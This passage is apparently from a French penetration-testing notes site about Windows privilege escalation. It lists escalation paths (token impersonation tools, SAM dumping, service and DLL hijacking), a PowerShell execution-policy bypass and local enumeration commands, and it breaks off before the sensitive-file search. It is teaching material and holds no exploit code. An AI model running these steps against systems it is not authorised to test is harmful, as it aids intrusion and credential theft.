+    <li class="md-nav__item">
+      <a href="../RedTeam/Phishing.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phishing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
+        
+          
+          <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Salesforce
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_19">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Salesforce
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Audit%20d%27architecture.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Audit d'architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Extractions.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Extractions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Revue%20de%20code%20source.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Revue de code source
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Revue%20de%20configuration.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Revue de configuration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Revue%20des%20acc%C3%A8s.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Revue des accès
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Tests%20d%27intrusion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tests d'intrusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_20" >
+        
+          
+          <label class="md-nav__link" for="__nav_20" id="__nav_20_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shells
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_20_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_20">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Shells
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Shells/Escape%20from%20Restricted%20Shells.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Escape from Restricted Shells
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Shells/Reverse%20Shells.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reverse Shells
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Shells/Upgrade%20to%20Fully%20Interactive%20TTYs.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Upgrade to Fully Interactive TTYs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" >
+        
+          
+          <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    System
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_21">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    System
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Certificats.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Certificats
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Kali.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kali
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/LVM.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LVM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Linux%20Boot%20repair.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Boot repair
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Setup%20Docker%20Lab.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Setup Docker Lab
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/UFW.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    UFW
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Update%20Debian.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Update Debian
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/VMware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    VMware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Windows%20Setup.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Setup
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Wipe%20un%20disque.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wipe un disque
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" >
+        
+          
+          <label class="md-nav__link" for="__nav_22" id="__nav_22_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_22">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/File%20Inclusion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/Reconnaissance.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/Ressources.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ressources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/SQL%20Injection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/Webshells.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Webshells
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/XSS%20Injection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#chemins-courants" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chemins Courants
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#commandes-utiles" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Commandes utiles
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumération
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumération">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeration-manuelle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumération manuelle
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumeration-automatique" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumération automatique
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumération automatique">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#privesccheck" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PrivescCheck
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#winpeas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        winPEAS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#seatbelt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Seatbelt
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Services
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows Services">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-binary-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service Binary Hijacking
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Service Binary Hijacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#manuel" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Manuel
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powerup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerUp
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dll-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DLL Hijacking
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DLL Hijacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#manuel_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Manuel
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powerup_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerUp
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unquoted-service-paths" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unquoted Service Paths
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Unquoted Service Paths">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#manuel_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Manuel
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powerup_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerUp
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scheduled-tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scheduled Tasks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kernel Exploits
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#seimpersonateprivilege" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SeImpersonatePrivilege
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SeImpersonatePrivilege">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#theorie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Théorie
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pratique" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pratique
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lolbas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LOLBAS
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trouver-des-creds" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trouver des Creds
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#create-admin-account-bypass-uac" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create Admin Account + Bypass UAC
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windowsold" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows.old
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alwaysinstallelevated" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AlwaysInstallElevated
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="windows">Windows</h1>
+<h2 id="chemins-courants">Chemins Courants</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Check</th>
+<th style="text-align: left;">Commande</th>
+<th style="text-align: left;">Escalade</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">SeImpersonatePrivilege</td>
+<td style="text-align: left;"><code>whoami /priv</code></td>
+<td style="text-align: left;">SigmaPotato / PrintSpoofer</td>
+</tr>
+<tr>
+<td style="text-align: left;">SeBackupPrivilege</td>
+<td style="text-align: left;"><code>whoami /priv</code></td>
+<td style="text-align: left;">SAM/SYSTEM dump → secretsdump</td>
+</tr>
+<tr>
+<td style="text-align: left;">Scheduled Tasks</td>
+<td style="text-align: left;"><code>schtasks /query /fo LIST /v</code></td>
+<td style="text-align: left;">Task hijack</td>
+</tr>
+<tr>
+<td style="text-align: left;">Unquoted Service</td>
+<td style="text-align: left;"><code>wmic service get name,pathname</code></td>
+<td style="text-align: left;">Binary replace / Service hijacking</td>
+</tr>
+<tr>
+<td style="text-align: left;">DLL Hijacking</td>
+<td style="text-align: left;">Process Monitor analysis</td>
+<td style="text-align: left;">DLL malveillante</td>
+</tr>
+<tr>
+<td style="text-align: left;">AlwaysInstallElevated</td>
+<td style="text-align: left;"><code>reg query HKLM\...\Installer</code></td>
+<td style="text-align: left;">MSI payload</td>
+</tr>
+<tr>
+<td style="text-align: left;">AutoLogon</td>
+<td style="text-align: left;">Registry Winlogon</td>
+<td style="text-align: left;">WinPEAS trouve automatiquement</td>
+</tr>
+<tr>
+<td style="text-align: left;">Saved credentials</td>
+<td style="text-align: left;"><code>cmdkey /list</code> + RunAs</td>
+<td style="text-align: left;"></td>
+</tr>
+<tr>
+<td style="text-align: left;">AllExtendedRights sur user</td>
+<td style="text-align: left;">Reset password</td>
+<td style="text-align: left;"></td>
+</tr>
+</tbody>
+</table>
+<h2 id="commandes-utiles">Commandes utiles</h2>
+<p><strong>ExecutionPolicy</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">Get-ExecutionPolicy</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">Set-ExecutionPolicy</span> <span class="n">Unrestricted</span> <span class="n">-Scope</span> <span class="k">Process</span>
+</code></pre></div>
+<h2 id="enumeration">Enumération</h2>
+<h3 id="enumeration-manuelle">Enumération manuelle</h3>
+<p><strong>Username et hostname</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>whoami
+</code></pre></div></p>
+<p><strong>Groupes de l'utilisateur courant</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>whoami /groups
+</code></pre></div></p>
+<p><strong>Utilisateurs locaux</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>net user
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>net user &lt;username&gt;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">Get-LocalUser</span>
+</code></pre></div>
+<p><strong>Groupes locaux</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>net localgroup
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>net localgroup &lt;groupname&gt;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Get-LocalGroup</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">Get-LocalGroupMember</span> <span class="p">&lt;</span><span class="n">groupname</span><span class="p">&gt;</span>
+</code></pre></div>
+<p><strong>OS, version et architecture</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>systeminfo
+</code></pre></div></p>
+<p><strong>Applications installées (32-bit et 64-bit)</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c"># 32bits</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">Get-ItemProperty</span> <span class="s2">"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c"># 64bits</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="nb">Get-ItemProperty</span> <span class="s2">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>dir "C:\Program Files"
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>dir "C:\Program Files (x86)"
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>dir C:\Users\&lt;user&gt;\Downloads
+</code></pre></div>
+<p><strong>Processus en cours d'exécution</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">Get-Process</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="c"># Process non standard Windows</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="nb">Get-Process</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Path</span> <span class="o">-notlike</span> <span class="s2">"C:\Windows\*"</span> <span class="o">-and</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Path</span> <span class="o">-ne</span> <span class="nv">$null</span><span class="p">}</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Id</span><span class="p">,</span> <span class="n">Name</span><span class="p">,</span> <span class="n">Path</span><span class="p">,</span> <span class="n">CPU</span><span class="p">,</span> <span class="n">WS</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c"># Path du binaire derrière le process</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="nb">Get-Process</span> <span class="n">NonStandardProcess</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Path</span>
+</code></pre></div></p>
+<p><strong>Services</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">State</span><span class="p">,</span> <span class="n">StartMode</span><span class="p">,</span> <span class="n">PathName</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c"># Ancienne méthode</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="nb">Get-WmiObject</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">State</span><span class="p">,</span> <span class="n">StartMode</span><span class="p">,</span> <span class="n">PathName</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="c"># Via registre</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="nb">Get-ItemProperty</span> <span class="s2">"HKLM:\SYSTEM\CurrentControlSet\Services\*"</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">PSChildName</span><span class="p">,</span> <span class="n">Start</span><span class="p">,</span> <span class="n">ImagePath</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="nb">Get-ItemProperty</span> <span class="s2">"HKLM:\SYSTEM\CurrentControlSet\Services\*"</span> <span class="p">|</span>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ImagePath</span> <span class="o">-notmatch</span> <span class="s2">"^$|system32|syswow64|SystemRoot|MsMpEng"</span><span class="p">}</span> <span class="p">|</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="nb">Select-Object</span> <span class="n">PSChildName</span><span class="p">,</span> <span class="n">ImagePath</span><span class="p">,</span> <span class="nb">Start</span>
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="c"># Start values in registry (HKLM:\SYSTEM\CurrentControlSet\Services)</span>
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="c"># 0 - Boot     : chargé par le bootloader avant le noyau</span>
+<a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="c"># 1 - System   : chargé par le noyau au démarrage</span>
+<a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="c"># 2 - Automatic: démarré automatiquement par le SCM au boot</span>
+<a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="c"># 3 - Manual   : démarré sur demande</span>
+<a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="c"># 4 - Disabled : désactivé</span>
+<a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a>
+<a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a><span class="c"># Via sc.exe</span>
+<a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a><span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">query</span> <span class="n">type</span><span class="p">=</span> <span class="n">all</span> <span class="n">state</span><span class="p">=</span> <span class="n">all</span>
+<a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a>
+<a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a><span class="c"># Autre</span>
+<a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a><span class="nb">Get-Service</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">Status</span><span class="p">,</span> <span class="n">StartType</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>wmic service get name,state,startmode,pathname
+</code></pre></div>
+<p><strong>Recherche de fichiers sensibles par extension</strong>
